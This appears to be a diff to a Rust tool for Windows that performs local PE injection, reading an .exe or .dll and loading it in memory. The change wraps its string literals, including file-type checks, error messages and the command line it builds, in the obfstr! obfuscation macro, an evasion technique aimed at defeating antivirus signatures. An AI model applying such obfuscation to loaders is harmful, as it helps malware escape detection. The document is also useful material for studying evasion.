@@ -41,6 +41,7 @@ use windows::Win32::System::Memory::*;
 use windows::Win32::System::SystemServices::*;
 use windows::Win32::System::Threading::*;
 use windows::Win32::System::WindowsProgramming::IMAGE_THUNK_DATA64;
+use obfstr::obfstr;
 
 // TODO, ici en paramètre, on donne le type (exe/dll) et ensuite le vec_u8 et la cmdline -> qui sera Args::parsel
 pub fn local_pe_injection(
@@ -53,15 +54,15 @@ pub fn local_pe_injection(
     let path = std::path::Path::new(&args.pe);
 
     let (param, export) = match path.extension().and_then(|ext| ext.to_str()) {
-        Some("exe") => (args.arg.clone().unwrap_or_default(), String::new()),
-        Some("dll") => (String::new(), args.export.clone().unwrap_or_default()),
+        Some(obfstr!("exe")) => (args.arg.clone().unwrap_or_default(), String::new()),
+        Some(obfstr!("dll")) => (String::new(), args.export.clone().unwrap_or_default()),
         _ => {
-            eprintln!("The supplied file does not have a valid extension (.exe or .dll)");
+            eprintln!("{}", obfstr!("The supplied file does not have a valid extension (.exe or .dll)"));
             return Ok(())
         }
     };
 
-    let buffer = std::fs::read(&args.pe).map_err(|e| format!("Error reading PE file: {e}"))?;
+    let buffer = std::fs::read(&args.pe).map_err(|e| format!("{}{e}", obfstr!("Error reading PE file: ")))?;
     let mut pe = initialize_pe(buffer)?;
     // Load the executable or DLL
     //load_exe(&mut pe, param, export)?;
@@ -446,7 +447,7 @@ fn fixing_arguments(args: &str) -> Result<(), String> {
 
         let current_exe = std::env::current_exe()
             .map_err(|e| format!("{}{}", encrypt_string!("Failed to get current exe path: ") ,e))?;
-        let path_name = format!("\"{}\" {}\0", current_exe.to_string_lossy(), args)
+        let path_name = format!("{}{}{}{}{}", obfstr!("\""), current_exe.to_string_lossy(), obfstr!("\" "), args, obfstr!("\0"))
             .encode_utf16()
             .collect::<Vec<u16>>();
 
